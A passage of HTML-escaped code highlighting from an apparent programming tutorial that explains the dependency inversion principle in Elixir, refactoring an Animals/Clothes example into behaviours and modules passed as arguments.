  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:hat&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Hat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:shirt&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Shirt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Mammal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:hat&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:shirt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ss"&gt;:ok&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"email@example.com"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:email&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We have defined the Animals.Clothes.Clothing behaviour and for instance the Animals.Clothes.Hat must use the add/1 callback, so in this way, we guarantee that all the modules that implement it have the same action without breaking the functionality.&lt;/p&gt;

&lt;p&gt;Now if we look at the Animals.Clothes module, we are explicitly declaring witch module has to be used depending on function parameters, this is incorrect accordingly with Dependency inversion principle, the correct way to fix this is to abstract the apply/2 function to receive a module in its arguments and use the function of that module because we have the type definition.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#dependency-inversion-principle"&gt;
  &lt;/a&gt;
  Dependency inversion principle
&lt;/h3&gt;

&lt;p&gt;"Depend upon abstractions, [not] concretions."&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="c1"&gt;# FROM&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@callback&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@spec&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:hat&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Hat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:shirt&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Shirt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="c1"&gt;#TO&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@type&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="nv"&gt;@callback&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@spec&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;clothing&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;clothing&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Mammal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Hat&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Shirt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ss"&gt;:ok&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"email@example.com"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:email&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;With the type definition, we can abstract the inner implementation to depend on the module itself, and we know what the module does because of the behaviour that it uses.&lt;/p&gt;

&lt;p&gt;If we look for the difference between the first implementation and the final result, it is more verbose, but much more readable, maintainable and extensible.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="c1"&gt;# FROM&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_mammal&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type lion&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_carnivorous&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type dog&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;get_picture&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#get picture from the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_email&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to email&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_whatsapp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to whatsapp&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="c1"&gt;#TO&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Mammal&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type mammal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Carnivorous&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type carnivorous&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#get picture from the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to email&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="ss"&gt;:whats&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to whatsapp&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@type&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="p"&gt;%{&lt;/span&gt;&lt;span class="ss"&gt;type:&lt;/span&gt; &lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;name:&lt;/span&gt; &lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;defstruct&lt;/span&gt; &lt;span class="sx"&gt;~w(type name)a&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@type&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="nv"&gt;@callback&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Hat&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@behaviour&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Shirt&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@behaviour&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a shirt to the animal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
